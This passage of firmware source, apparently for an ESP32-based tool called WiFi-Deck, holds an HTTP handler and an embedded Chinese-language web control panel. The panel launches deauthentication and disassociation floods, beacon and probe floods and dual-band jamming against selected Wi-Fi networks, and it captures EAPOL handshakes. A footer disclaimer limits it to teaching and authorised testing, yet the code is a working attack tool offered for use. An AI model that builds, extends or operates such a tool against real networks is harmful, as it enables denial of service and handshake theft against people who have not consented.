        for (size_t k = 0; k < numCfgKeys; k++) {
          String key = cfgKeys[k];
          if (!hasFormKey(body, key)) continue;
          String val = getPostValue(body, key);
          val.trim();
          if (applyConfigSetting(key, val, apChanged)) {
            anyUpdated = true;
            result += key + " updated ";
          }
        }
        if (anyUpdated) {
          saveConfigToFlash();
          blePushInfo();
          if (apChanged) {
            scheduleApRestart();
          }
        }
        String json = "{\"status\":\"ok\",\"ap_restarted\":" + String(pendingApRestart ? "true" : "false") +
                      ",\"message\":\"" + jsonEscape(result) + "\"}";
        sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
      }
    }
  }
  else if (path == "/") {
    if (method == "GET") {
      sendHttpResponse(client, 200, "text/html", INDEX_HTML, strlen(INDEX_HTML));
    } else {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    }
  }
  else {
    String msg = "404 Not Found";
    sendHttpResponse(client, 404, "text/plain", msg.c_str(), msg.length());
  }

  if (!clientClosed) {
    delay(10);
    client.stop();
  }
  if (USE_LED) digitalWrite(LED_G, LOW);
}

//==========================================================
// HTML Page (Mobile-friendly Web UI)
//==========================================================
const char INDEX_HTML[] = R"=====(<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0d1117">
<title>WiFi-Deck</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#f0f6fc;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding-bottom:60px}
.header{background:#161b22;padding:10px 14px;position:sticky;top:0;z-index:100;border-bottom:1px solid #2b323c}
.header-top{display:flex;justify-content:space-between;align-items:center}
.header h1{font-size:17px;font-weight:700;display:flex;align-items:center;gap:6px}
.badge{font-size:10px;padding:2px 6px;border-radius:4px;background:#102828;color:#39c5bb;border:1px solid rgba(57,197,187,.4)}
.status-dot{width:10px;height:10px;border-radius:50%;background:#3fb950;transition:.3s}
.status-dot.active{background:#8957e5;box-shadow:0 0 8px #8957e5}
.status-dot.attacking{background:#e94560;box-shadow:0 0 8px #e94560;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.telemetry{display:flex;justify-content:space-between;margin-top:8px;padding-top:6px;border-top:1px solid #21262d;font-family:monospace;font-size:11px;color:#8b949e}
.telemetry b{color:#f0f6fc}
.tabs{display:flex;background:#161b22;border-bottom:1px solid #2b323c;position:sticky;top:59px;z-index:99}
.tab{flex:1;padding:11px 0;text-align:center;font-size:12px;font-weight:600;color:#8b949e;cursor:pointer;border-bottom:2px solid transparent;transition:.2s}
.tab.active{color:#e94560;border-color:#e94560;background:#1a1f29}
.page{display:none;padding:12px}
.page.active{display:block}
.row{display:flex;gap:8px;align-items:center;margin:6px 0}
.chips{display:flex;gap:6px;overflow-x:auto;padding:4px 0;scrollbar-width:none}
.chip{white-space:nowrap;padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;background:#161b22;color:#8b949e;border:1px solid #2b323c;cursor:pointer}
.chip.active{background:#2d161e;color:#e94560;border-color:#e94560}
.search-box{flex:1;padding:8px 10px;background:#161b22;border:1px solid #2b323c;border-radius:8px;color:#f0f6fc;font-size:12px}
.btn{display:inline-block;width:100%;padding:11px;margin:4px 0;border:1px solid transparent;border-radius:8px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;transition:.15s}
.btn:active{transform:scale(.98)}
.btn-primary{background:#e94560;color:#fff}
.btn-success{background:#2ea043;color:#fff}
.btn-warning{background:#d29922;color:#000}
.btn-info{background:#2f81f7;color:#fff}
.btn-dark{background:#161b22;color:#f0f6fc;border-color:#2b323c}
.btn.running,.btn-dark.running{background:#12261a;color:#3fb950;border-color:#3fb950}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:6px 0}
.net-item{background:#161b22;border-radius:9px;padding:10px 12px;margin:6px 0;display:flex;align-items:center;cursor:pointer;border:1px solid #2b323c;transition:.15s}
.net-item.selected{border-color:#e94560;background:#2d161e}
.net-info{flex:1;min-width:0}
.net-ssid{font-size:13px;font-weight:600;margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.net-meta{font-size:11px;color:#8b949e;font-family:monospace}
.net-band{font-size:10px;padding:1px 5px;border-radius:4px;margin-left:5px;font-weight:700}
.net-band.band5{background:#231934;color:#8957e5;border:1px solid rgba(137,87,229,.5)}
.net-band.band24{background:#14233a;color:#2f81f7;border:1px solid rgba(47,129,247,.5)}
.net-check{width:22px;height:22px;border:1.5px solid #6e7681;border-radius:6px;display:flex;align-items:center;justify-content:center;margin-left:10px}
.net-item.selected .net-check{background:#e94560;border-color:#e94560}
.net-item.selected .net-check::after{content:'✓';color:#fff;font-size:13px}
.bar{width:100%;height:5px;background:#21262d;border-radius:3px;overflow:hidden;margin-top:5px}
.bar-fill{height:100%;border-radius:3px}
.bar-fill.good{background:#3fb950}
.bar-fill.mid{background:#d29922}
.bar-fill.bad{background:#e94560}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:6px 0}
.stat-card{background:#161b22;border:1px solid #2b323c;border-radius:8px;padding:8px;text-align:center}
.stat-val{font-size:17px;font-weight:700;color:#e94560;font-family:monospace}
.stat-label{font-size:10px;color:#8b949e;margin-top:2px}
.term{background:#090c10;border:1px solid #2b323c;border-radius:8px;padding:8px;height:260px;overflow-y:auto;font-family:monospace;font-size:11px;line-height:1.45;color:#c9d1d9}
.log-line{padding:2px 4px;border-bottom:1px solid #161b22;word-break:break-all}
.log-eapol{color:#d29922;background:rgba(210,153,34,.12)}
.log-deauth{color:#e94560;background:rgba(233,69,96,.12)}
.config-row{display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:#161b22;border:1px solid #2b323c;border-radius:8px;margin:5px 0}
.config-label{font-size:12px;color:#c9d1d9}
.config-input{width:130px;padding:6px 8px;background:#0d1117;border:1px solid #2b323c;border-radius:6px;color:#fff;font-size:12px;text-align:right;font-family:monospace}
.loading{display:none;text-align:center;padding:16px;color:#8b949e;font-size:12px}
.loading.show{display:block}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1f2631;color:#f0f6fc;padding:8px 16px;border-radius:20px;font-size:12px;z-index:200;opacity:0;transition:.25s;pointer-events:none;border:1px solid #e94560}
.toast.show{opacity:1}
.modal-mask{display:none;position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:300;align-items:center;justify-content:center;padding:16px}
.modal-mask.show{display:flex}
.modal-card{background:#161b22;border:1px solid #2b323c;border-radius:12px;max-width:360px;width:100%;padding:16px}
.modal-title{font-size:15px;font-weight:700;margin-bottom:8px;color:#f0f6fc}
.modal-body{font-size:12px;line-height:1.55;color:#c9d1d9;margin-bottom:14px}
.banner{display:none;background:#1d192b;border:1px solid #8957e5;border-radius:8px;padding:8px 10px;margin:6px 0;font-size:12px;color:#e6edf3}
.banner.show{display:block}
.footer{text-align:center;padding:12px 8px;font-size:11px;color:#6e7681}
</style>
</head>
<body>
<div class="header">
  <div class="header-top">
    <h1>⚡ <span id="hdrName">WiFi-Deck</span> <span class="badge">2.4G / 5G</span></h1>
    <div class="status-dot" id="statusDot"></div>
  </div>
  <div class="telemetry">
    <span>CH: <b id="topCh">--</b></span>
    <span>APs: <b id="topAps">0</b></span>
    <span>目标: <b id="topTargets">0</b></span>
    <span>TX OK: <b id="topTxOk" style="color:#3fb950">0</b></span>
    <span>FAIL: <b id="topTxFail">0</b></span>
  </div>
</div>
<div class="tabs">
  <div class="tab active" onclick="showPage('scan')">📡 扫描</div>
  <div class="tab" onclick="showPage('attack')">⚔️ 控制</div>
  <div class="tab" onclick="showPage('sniff')">📟 抓包</div>
  <div class="tab" onclick="showPage('config')">⚙️ 设置</div>
</div>

<div class="page active" id="page-scan">
  <div class="row">
    <input class="search-box" id="searchBox" placeholder="搜索 SSID / BSSID..." oninput="renderNetworks()">
    <button class="btn btn-info" style="width:auto;padding:8px 14px;margin:0" onclick="doScan()">🔄 扫描双频</button>
  </div>
  <div class="chips">
    <div class="chip active" id="flt-all" onclick="setBand('ALL')">全部 (0)</div>
    <div class="chip" id="flt-24" onclick="setBand('2.4G')">2.4G (0)</div>
    <div class="chip" id="flt-5" onclick="setBand('5G')">5G (0)</div>
    <div class="chip active" id="srt-rssi" onclick="setSort('RSSI')">信号↓</div>
    <div class="chip" id="srt-ch" onclick="setSort('CH')">信道↑</div>
    <div class="chip" onclick="selectAllVisible()">全选</div>
    <div class="chip" onclick="clearSelection()">清空</div>
  </div>
  <div class="loading" id="scanLoading">正在扫描 2.4GHz & 5GHz 频段... (约5秒)</div>
  <div id="netList"></div>
</div>

<div class="page" id="page-attack">
  <div class="banner" id="timedBanner"></div>
  <div class="banner" id="atkReconnectBanner"></div>
  <div class="stats">
    <div class="stat-card"><div class="stat-val" id="statTargets">0</div><div class="stat-label">已选目标</div></div>
    <div class="stat-card"><div class="stat-val" id="statTxOk" style="color:#3fb950">0</div><div class="stat-label">TX 成功</div></div>
    <div class="stat-card"><div class="stat-val" id="statCh">--</div><div class="stat-label">当前信道</div></div>
  </div>
  <div class="grid2">
    <button class="btn btn-primary" id="btnDeauth" onclick="startAttack('start deauther')">▶️ Deauth 压制</button>
    <button class="btn btn-warning" id="btnDisassoc" onclick="startAttack('disassoc')">▶️ Disassoc 剥离</button>
    <button class="btn btn-dark" onclick="singleApAttack()">🎯 单目标点射</button>
    <button class="btn btn-dark" onclick="sendCmd('random_attack')">🎲 随机信道抽样</button>
  </div>
  <div class="grid2">
    <button class="btn btn-dark" id="btnBcn" onclick="sendCmd('beacon_flood')">📶 Beacon 伪热点</button>
    <button class="btn btn-dark" id="btnPrb" onclick="sendCmd('probe_flood')">📡 Probe 探测泛洪</button>
    <button class="btn btn-dark" id="btnJam" onclick="sendCmd('signal_jam')">📳 Signal Jam 双频</button>
    <button class="btn btn-dark" id="btnClone" onclick="startSniffClone()">🎯 Deauth 嗅探克隆</button>
  </div>
  <div class="row">
    <button class="btn btn-dark" onclick="timedAttackPreset(10000)">⏱️ 10s</button>
    <button class="btn btn-dark" onclick="timedAttackPreset(30000)">⏱️ 30s</button>
    <button class="btn btn-dark" onclick="timedAttackPreset(60000)">⏱️ 60s</button>
    <button class="btn btn-dark" onclick="sendCmd('reset_txstats')">🧹 清零TX</button>
  </div>
  <button class="btn btn-success" onclick="sendCmd('stop')">⏹️ 紧急停止所有任务 (STOP ALL)</button>
</div>

<div class="page" id="page-sniff">
  <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
    💡 网页端开启抓包时会自动进入混杂模式 15 秒（热点将暂时中断），结束后自动恢复 WiFi 热点并回读捕获报文。
  </div>
  <div class="banner" id="sniffReconnectBanner"></div>
  <div class="grid2">
    <button class="btn btn-info" onclick="startWebSniff('all')">👁️ 15s 抓包 (ALL)</button>
    <button class="btn btn-warning" onclick="startWebSniff('eapol')">🔑 15s 抓包 (EAPOL)</button>
    <button class="btn btn-dark" onclick="startWebSniff('deauth')">🚨 15s 抓包 (Deauth)</button>
    <button class="btn btn-dark" onclick="startWebSniff('probe')">📡 15s 抓包 (Probe)</button>
  </div>
  <div class="row">
    <button class="btn btn-dark" id="btnHopOn" onclick="sendCmd('hop on')">📺 跳频: 开</button>
    <button class="btn btn-dark" id="btnHopOff" onclick="sendCmd('hop off')">📺 跳频: 关</button>
    <button class="btn btn-dark" onclick="copyLogs()">📋 复制日志</button>
    <button class="btn btn-dark" onclick="clearWebLogs()">🗑️ 清空</button>
  </div>
  <div class="term" id="logBox"><div style="color:#6e7681;text-align:center;padding-top:90px">暂无抓包记录，点击上方按钮开始捕获</div></div>
</div>

<div class="page" id="page-config">
  <div class="config-row"><span class="config-label">BLE 蓝牙名称 (1~26B)</span><input class="config-input" type="text" maxlength="26" id="cfgBleName" value="WiFi-Deck"></div>
  <div class="config-row"><span class="config-label">WiFi 热点名称 (1~32B)</span><input class="config-input" type="text" maxlength="32" id="cfgApSsid" value="WiFi-Deck"></div>
  <div class="config-row"><span class="config-label">WiFi 热点密码 (8~63位)</span><input class="config-input" type="password" maxlength="63" id="cfgApPass" value="" placeholder="留空表示不修改" autocomplete="new-password"></div>
  <div style="font-size:11px;color:#8b949e;padding:2px 4px 4px">🔒 当前热点密码不以明文回显；留空保存则维持原密码不变。如需永久关闭热点请改用 BLE App 或串口。</div>
  <div class="config-row"><span class="config-label">攻击间隔 (100~60000ms)</span><input class="config-input" type="number" min="100" max="60000" id="cfgCycleDelay" value="2000"></div>
  <div class="config-row"><span class="config-label">扫描时间 (500~30000ms)</span><input class="config-input" type="number" min="500" max="30000" id="cfgScanTime" value="5000"></div>
  <div class="config-row"><span class="config-label">单次突发帧数 (1~100)</span><input class="config-input" type="number" min="1" max="100" id="cfgNumFrames" value="3"></div>
  <div class="config-row"><span class="config-label">起始信道 (1 或 36~165)</span><input class="config-input" type="number" min="1" max="165" id="cfgStartChannel" value="1"></div>
  <div class="config-row"><span class="config-label">循环间重扫</span><select class="config-input" id="cfgScanCycles"><option value="off">关</option><option value="on">开</option></select></div>
  <div class="config-row"><span class="config-label">板载 LED 指示灯</span><select class="config-input" id="cfgLed"><option value="on">开</option><option value="off">关</option></select></div>
  <button class="btn btn-primary" onclick="saveConfig()">💾 保存配置 (写入 Flash 掉电记忆)</button>
  <button class="btn btn-dark" onclick="resetDefaultConfig()">🔄 恢复出厂默认配置</button>
  <div class="stat-card" style="margin-top:8px"><div class="stat-val" id="cfgUptime">--</div><div class="stat-label">系统运行时间</div></div>
  <div class="footer">WiFi-Deck | Dual-Band 802.11 Protocol Analyzer<br>⚠️ 仅用于无线网络安全教学与合法授权测试</div>
</div>
<div class="modal-mask" id="confirmMask">
  <div class="modal-card">
    <div class="modal-title" id="confirmTitle">操作确认</div>
    <div class="modal-body" id="confirmBody"></div>
    <div class="grid2">
      <button class="btn btn-dark" onclick="closeConfirm(false)">取消</button>
      <button class="btn btn-primary" onclick="closeConfirm(true)">继续执行</button>
    </div>
  </div>
</div>
<div class="toast" id="toast"></div>
<script>
const API='/api';
let selectedIndices=new Set(),scanCache=null,bandFilter='ALL',sortMode='RSSI',cachedLogs=[];
let curAtkState={deauth:false,disassoc:false,clone:false,hopping:false,targetMode:false};
let selectionDirty=false,lastServerScanCount=-1,lastServerTargetCount=-1;
let statsInFlight=false,logsInFlight=false,reconnectingAP=false,reconnectTimer=null,confirmResolver=null;
function showPage(p){
  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['scan','attack','sniff','config'][i]===p));
  document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active'));
  document.getElementById('page-'+p).classList.add('active');
  if(p==='attack')updateAttackStats();
  if(p==='sniff')fetchLogs();
  if(p==='config')initStatus(false);
}
function toast(msg){let t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2400);}
function showConfirm(title,body){
  document.getElementById('confirmTitle').textContent=title;
  document.getElementById('confirmBody').textContent=body;
  document.getElementById('confirmMask').classList.add('show');
  return new Promise(res=>{confirmResolver=res;});
}
function closeConfirm(ok){
  document.getElementById('confirmMask').classList.remove('show');
  if(confirmResolver){let r=confirmResolver;confirmResolver=null;r(!!ok);}
}
async function fetchAPI(url,opts={},timeoutMs=3500){
  let ctrl=typeof AbortController!=='undefined'?new AbortController():null;
  let timer=ctrl?setTimeout(()=>ctrl.abort(),timeoutMs):null;
  try{
    let reqOpts=ctrl?Object.assign({},opts,{signal:ctrl.signal}):opts;
    let r=await fetch(url,reqOpts);
    let data=null;
    try{data=await r.json();}catch(e){data=null;}
    return{ok:r.ok,status:r.status,data,aborted:false};
  }catch(e){
    return{ok:false,status:0,data:null,aborted:(e&&e.name==='AbortError')};
  }finally{
    if(timer)clearTimeout(timer);
  }
}
async function fetchJSON(url,opts={},timeoutMs=3500){
  let res=await fetchAPI(url,opts,timeoutMs);
  return res.ok?res.data:null;
}
async function syncScanFromServer(){
  let res=await fetchAPI(API+'/scan',{},4000);
  if(res.ok&&res.data){
    scanCache=res.data;
    lastServerScanCount=res.data.count||0;
    if(!selectionDirty){
      selectedIndices.clear();
      let srvTargets=0;
      (res.data.networks||[]).forEach(n=>{if(n.selected){selectedIndices.add(n.index);srvTargets++;}});
      lastServerTargetCount=srvTargets;
    }
    renderNetworks();
  }
}
async function doScan(){
  if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
  document.getElementById('scanLoading').classList.add('show');
  document.getElementById('netList').innerHTML='';
  selectedIndices.clear();
  selectionDirty=false;
  let scanMs=Number(document.getElementById('cfgScanTime').value)||5000;
  let timeoutMs=Math.max(10000,scanMs+5000);
  let res=await fetchAPI(API+'/scan',{method:'POST'},timeoutMs);
  if(!res.ok){
    toast('扫描失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
    document.getElementById('scanLoading').classList.remove('show');
    return;
  }
  await syncScanFromServer();
  if(scanCache)toast('扫描完成: '+scanCache.count+' 个网络');
  document.getElementById('scanLoading').classList.remove('show');
  updateAttackStats();
}
function setBand(b){
  bandFilter=b;
  document.getElementById('flt-all').classList.toggle('active',b==='ALL');
  document.getElementById('flt-24').classList.toggle('active',b==='2.4G');
  document.getElementById('flt-5').classList.toggle('active',b==='5G');
  renderNetworks();
}
function setSort(s){
  sortMode=s;
  document.getElementById('srt-rssi').classList.toggle('active',s==='RSSI');
  document.getElementById('srt-ch').classList.toggle('active',s==='CH');
  renderNetworks();
}
function getFilteredNetworks(){
  if(!scanCache||!scanCache.networks)return[];
  let q=(document.getElementById('searchBox').value||'').trim().toLowerCase();
  return scanCache.networks.filter(n=>{
    let bOk=bandFilter==='ALL'||(bandFilter==='5G'?n.channel>=36:n.channel<36);
    let qOk=!q||(n.ssid||'').toLowerCase().includes(q)||(n.bssid||'').toLowerCase().includes(q);
    return bOk&&qOk;
  }).sort((a,b)=>sortMode==='RSSI'?(b.rssi-a.rssi):(a.channel-b.channel));
}
function updateTargetDisplays(){
  let cnt=selectionDirty?selectedIndices.size:(lastServerTargetCount>=0?lastServerTargetCount:selectedIndices.size);
  document.getElementById('topTargets').textContent=cnt;
  document.getElementById('statTargets').textContent=cnt;
}
function renderNetworks(){
  if(!scanCache){
    syncScanFromServer().then(()=>updateAttackStats());
    return;
  }
  let nets=scanCache.networks||[];
  let c24=nets.filter(n=>n.channel<36).length,c5=nets.filter(n=>n.channel>=36).length;
  document.getElementById('flt-all').textContent=`全部 (${nets.length})`;
  document.getElementById('flt-24').textContent=`2.4G (${c24})`;
  document.getElementById('flt-5').textContent=`5G (${c5})`;
  document.getElementById('topAps').textContent=nets.length;
  updateTargetDisplays();
  let list=getFilteredNetworks(),html='';
  list.forEach(n=>{
    let pct=Math.max(8,Math.min(100,Math.round((n.rssi+100)*1.5)));
    let cls=n.rssi>=-60?'good':(n.rssi>=-75?'mid':'bad');
    let bandCls=n.channel>=36?'band5':'band24';
    let bandTxt=n.channel>=36?'5G':'2.4G';
    let sel=selectedIndices.has(n.index)?'selected':'';
    html+=`<div class="net-item ${sel}" onclick="toggleNet(${n.index})"><div class="net-info"><div class="net-ssid">${escHtml(n.ssid||'(隐藏 SSID)')}<span class="net-band ${bandCls}">${bandTxt}</span></div><div class="net-meta">#${n.index} · CH ${n.channel} · ${n.bssid} · ${n.rssi} dBm</div><div class="bar"><div class="bar-fill ${cls}" style="width:${pct}%"></div></div></div><div class="net-check"></div></div>`;
  });
  if(!html)html='<p style="text-align:center;color:#6e7681;padding:28px">暂无匹配热点，请点击右上角扫描</p>';
  document.getElementById('netList').innerHTML=html;
}
function toggleNet(idx){if(selectedIndices.has(idx))selectedIndices.delete(idx);else selectedIndices.add(idx);selectionDirty=true;renderNetworks();}
function selectAllVisible(){getFilteredNetworks().forEach(n=>selectedIndices.add(n.index));selectionDirty=true;renderNetworks();toast('已勾选 '+selectedIndices.size+' 个目标');}
function clearSelection(){selectedIndices.clear();selectionDirty=true;renderNetworks();}
function getAtomicTargetSpec(){
  if(scanCache&&scanCache.networks&&scanCache.networks.length>0&&selectedIndices.size===scanCache.networks.length){
    return 'all';
  }
  return Array.from(selectedIndices).sort((a,b)=>a-b).join(',');
}
async function setTargets(){
  let indices=Array.from(selectedIndices).sort((a,b)=>a-b).join(',');
  let res=await fetchAPI(API+'/target?indices='+encodeURIComponent(indices),{method:'POST'},3500);
  if(res.ok&&res.data&&res.data.status==='ok'){
    selectionDirty=false;
    lastServerTargetCount=res.data.targets||0;
    updateTargetDisplays();
    return true;
  }
  toast('目标同步失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
  return false;
}
async function startAttack(cmd){
  if(cmd==='start deauther'&&curAtkState.deauth){await sendCmd('stop');return;}
  if(cmd==='disassoc'&&curAtkState.disassoc){await sendCmd('disassoc');return;}
  if(selectedIndices.size===0){toast('请先在扫描页勾选至少一个目标');return;}
  if(!(await setTargets()))return;
  let spec=getAtomicTargetSpec();
  await sendCmd(cmd+' '+spec);
}
async function singleApAttack(){
  if(selectedIndices.size===0){toast('请先在扫描页选择一个目标');return;}
  let firstIdx=Array.from(selectedIndices)[0];
  await sendCmd('single_ap '+firstIdx);
}
async function timedAttackPreset(ms){
  if(selectedIndices.size===0){toast('请先在扫描页勾选至少一个目标');return;}
  if(!(await setTargets()))return;
  let spec=getAtomicTargetSpec();
  await sendCmd('attack_time '+ms+' '+spec);
}
function escHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
async function sendCmd(cmd){
  let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)},4000);
  if(res.ok&&res.data&&res.data.status==='ok'){
    toast('已执行: '+cmd);
    setTimeout(updateAttackStats,300);
    return true;
  }
  toast('命令失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
  return false;
}
function setReconnectBanners(msg){
  ['sniffReconnectBanner','atkReconnectBanner'].forEach(id=>{
    let el=document.getElementById(id);
    if(!el)return;
    if(msg){el.textContent=msg;el.classList.add('show');}
    else{el.classList.remove('show');el.textContent='';}
  });
}
function startReconnectCountdown(seconds,onRecovered){
  if(reconnectTimer){clearInterval(reconnectTimer);reconnectTimer=null;}
  reconnectingAP=true;
  let rem=seconds;
  setReconnectBanners(`⏳ 热点已暂停用于混杂模式，约 ${rem} 秒后自动恢复并回读数据...`);
  reconnectTimer=setInterval(async()=>{
    if(rem>0){
      rem--;
      setReconnectBanners(rem>0?`⏳ 热点已暂停用于混杂模式，约 ${rem} 秒后自动恢复...`:'🔄 正在重连热点并回读数据...');
      return;
    }
    clearInterval(reconnectTimer);reconnectTimer=null;
    for(let attempt=0;attempt<12;attempt++){
      let st=await fetchAPI(API+'/status',{},2000);
      if(st.ok&&st.data&&!st.data.sniffing){
        reconnectingAP=false;
        setReconnectBanners('');
        toast('热点已重连');
        if(onRecovered)await onRecovered();
        return;
      }
      setReconnectBanners(`🔄 等待手机重新连回热点并恢复通信 (${attempt+1}/12)...`);
      await new Promise(r=>setTimeout(r,1500));
    }
    reconnectingAP=false;
    setReconnectBanners('⚠️ 自动重连超时，请确认手机已重新连上设备热点后刷新页面。');
  },1000);
}
async function startWebSniff(mode){
  if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
  let confirmed=await showConfirm('抓包模式提示','启用 15 秒抓包会将设备切换至混杂监听模式，期间设备热点及本网页会暂时断开，结束后自动恢复热点并回读捕获报文。是否继续？');
  if(!confirmed)return;
  let cmd='sniff_time 15000 '+mode;
  let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)},3500);
  if(!res.ok){
    toast('启动抓包失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
    return;
  }
  toast('已开启 15s 抓包，热点将在抓包结束后自动恢复');
  startReconnectCountdown(15,async()=>{await fetchLogs();await updateAttackStats();});
}
async function startSniffClone(){
  if(curAtkState.clone){await sendCmd('stop');return;}
  if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
  let confirmed=await showConfirm('嗅探克隆提示','启用 Deauth 嗅探克隆将暂停设备热点并进入混杂监听。未连接蓝牙控制端时约 15 秒后自动恢复热点；如已连接蓝牙 App 可在 App 内随时停止。是否继续？');
  if(!confirmed)return;
  let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd=deauth_sniff'},3500);
  if(!res.ok){
    toast('启动失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
    return;
  }
  toast('Deauth 嗅探克隆已启动，热点将在恢复后重连');
  startReconnectCountdown(15,async()=>{await updateAttackStats();});
}
async function fetchLogs(){
  if(logsInFlight||reconnectingAP)return;
  logsInFlight=true;
  try{
    let d=await fetchJSON(API+'/logs',{},3500);
    if(!d||!d.logs)return;
    cachedLogs=d.logs;
    let box=document.getElementById('logBox');
    if(cachedLogs.length===0){box.innerHTML='<div style="color:#6e7681;text-align:center;padding-top:90px">暂无抓包记录，点击上方按钮开始捕获</div>';return;}
    box.innerHTML=cachedLogs.map((l,i)=>{
      let cls=l.includes('EAPOL')?'log-eapol':(l.includes('Deauth')||l.includes('Disassoc')?'log-deauth':'');
      return `<div class="log-line ${cls}">${String(i+1).padStart(2,'0')} ${escHtml(l)}</div>`;
    }).join('');
    box.scrollTop=box.scrollHeight;
  }finally{
    logsInFlight=false;
  }
}
async function clearWebLogs(){
  let res=await fetchAPI(API+'/logs/clear',{method:'POST'},3500);
  if(res.ok){
    cachedLogs=[];
    await fetchLogs();
    toast('已清空抓包日志');
  }else{
    toast('清空失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
  }
}
function utf8ByteLen(s){return typeof TextEncoder!=='undefined'?new TextEncoder().encode(s).length:unescape(encodeURIComponent(s)).length;}
function copyTextFallback(text,okMsg){
  let ta=document.createElement('textarea');
  ta.value=text;ta.setAttribute('readonly','');
  ta.style.cssText='position:fixed;left:-9999px;top:0;opacity:0';
  document.body.appendChild(ta);ta.select();ta.setSelectionRange(0,text.length);
  let ok=false;
  try{ok=document.execCommand('copy');}catch(e){ok=false;}
  document.body.removeChild(ta);
  toast(ok?okMsg:'当前浏览器不支持自动复制，请长按日志手动复制');
}
function copyLogs(){
  if(!cachedLogs.length){toast('暂无日志可复制');return;}
  let text=cachedLogs.join('\n'),okMsg='已复制 '+cachedLogs.length+' 条记录';
  if(navigator.clipboard&&window.isSecureContext){
    navigator.clipboard.writeText(text).then(()=>toast(okMsg)).catch(()=>copyTextFallback(text,okMsg));
  }else{
    copyTextFallback(text,okMsg);
  }
}
async function updateAttackStats(){
  updateTargetDisplays();
  if(statsInFlight||reconnectingAP)return;
  statsInFlight=true;
  try{
    let d=await fetchJSON(API+'/status',{},2500);
    if(d){
      let srvScan=Number(d.scan_count||0);
      let srvTarget=Number(d.target_count||0);
      let needScanSync=!selectionDirty&&(srvScan!==lastServerScanCount||srvTarget!==lastServerTargetCount);
      lastServerScanCount=srvScan;
      lastServerTargetCount=srvTarget;
      updateTargetDisplays();

      document.getElementById('topCh').textContent=d.current_channel||'--';
      document.getElementById('statCh').textContent=d.current_channel||'--';
      document.getElementById('topAps').textContent=srvScan;
      document.getElementById('topTxOk').textContent=d.tx_ok||0;
      document.getElementById('statTxOk').textContent=d.tx_ok||0;
      document.getElementById('topTxFail').textContent=d.tx_fail||0;
      curAtkState.deauth=!!d.attack_enabled;
      curAtkState.disassoc=!!d.disassoc_enabled;
      curAtkState.clone=!!d.deauth_sniff;
      curAtkState.hopping=!!d.hopping;
      curAtkState.targetMode=!!d.target_mode;
      document.getElementById('btnDeauth').classList.toggle('running',curAtkState.deauth);
      document.getElementById('btnDisassoc').classList.toggle('running',curAtkState.disassoc);
      document.getElementById('btnBcn').classList.toggle('running',!!d.beacon_flood);
      document.getElementById('btnPrb').classList.toggle('running',!!d.probe_flood);
      document.getElementById('btnJam').classList.toggle('running',!!d.signal_jam);
      document.getElementById('btnClone').classList.toggle('running',curAtkState.clone);
      let bHopOn=document.getElementById('btnHopOn'),bHopOff=document.getElementById('btnHopOff');
      if(bHopOn&&bHopOff){bHopOn.classList.toggle('running',curAtkState.hopping);bHopOff.classList.toggle('running',!curAtkState.hopping);}
      let tb=document.getElementById('timedBanner');
      if(tb){
        if(d.timed_attack&&d.timed_remaining>0){
          tb.textContent=`⏱️ 定时压制进行中，剩余 ${Math.ceil(d.timed_remaining/1000)} 秒`;
          tb.classList.add('show');
        }else{
          tb.classList.remove('show');
        }
      }
      let dot=document.getElementById('statusDot');
      dot.className='status-dot';
      if(d.attack_enabled||d.disassoc_enabled||d.beacon_flood||d.probe_flood||d.signal_jam||d.deauth_sniff)dot.classList.add('attacking');
      else if(d.sniffing)dot.classList.add('active');
      let s=Math.floor(d.uptime/1000),m=Math.floor(s/60),h=Math.floor(m/60);
      document.getElementById('cfgUptime').textContent=h+'h '+(m%60)+'m '+(s%60)+'s';
      let nextSsid=d.ssid||'',nextBle=d.ble_name||'';
      if((nextSsid&&nextSsid!==syncedSsid)||(nextBle&&nextBle!==syncedBle)){
        syncedSsid=nextSsid;syncedBle=nextBle;
        applyHeaderIdentity(nextSsid,nextBle);
        initStatus(false);
      }else if(nextSsid||nextBle){
        applyHeaderIdentity(nextSsid,nextBle);
      }
      if(needScanSync)syncScanFromServer();
    }
  }finally{
    statsInFlight=false;
  }
}
let loadedBleName='WiFi-Deck',loadedApSsid='WiFi-Deck';
let syncedSsid='',syncedBle='',dirtyFields=new Set();
